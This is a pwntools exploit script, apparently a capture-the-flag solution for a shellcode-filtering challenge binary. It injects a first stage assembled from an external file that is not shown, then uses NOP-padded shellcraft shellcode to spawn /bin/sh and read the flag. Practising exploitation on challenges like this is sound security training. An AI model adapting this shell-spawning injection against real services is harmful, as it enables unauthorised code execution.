#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template chal --host 127.0.0.1 --port 8080
from pwn import *
import tty

# Set up pwntools for the correct architecture
exe = context.binary = ELF('chal') # for lcoal debuging

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '127.0.0.1'
port = int(args.PORT or 8080)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *run_shellcode+28
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

run_sh = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)


def send_shellcode(shellcode):
    io.recvuntil("Please enter lenght of shellcode without ret,jmp,push,int,call and pop\n")
    io.sendline("%d"%len(shellcode))
    io.recvuntil("Enter shellcode:/>")
    io.send(shellcode)



def generate_shellcode(shellcode_file,arguments=""):

    with open(shellcode_file,"r") as shell:
        code = shell.read()
        if arguments != "":
            code = (code % arguments)
            print("DEBUG %s" % code)
            code = code.strip()
        return asm(code, arch = 'amd64')




stage_1 = """Shelcode som finner jmps """
stage_2 = """Lekker instruksjon for å finne got"""
stage_3 = """Assembly som kjører /bin/sh""" 

#send_shellcode("\x48\x8B\x04\x24\x48\x2D\x3D\x04\x00\x00\x48\x8B\x00")
#send_shellcode("\x48\x8B\x04\x24\x48\x2D\x3D\x04\x00\x00\xBA\x00\x00\x00\x00\x8B\x10\x48\x31\xC0\x48\x89\xD0")
#"\x48\x8B\x04\x24\x48\x2D\x3D\x04\x00\x00\x48\x8B\x00"

send_shellcode(generate_shellcode("Solve.s")+b"\x90"*5000)

io.recvuntil("Return value = ")

send_shellcode(b"\x90"*100+run_sh)


io.sendline("id")
io.sendline("cat flag")
print()
io.interactive()

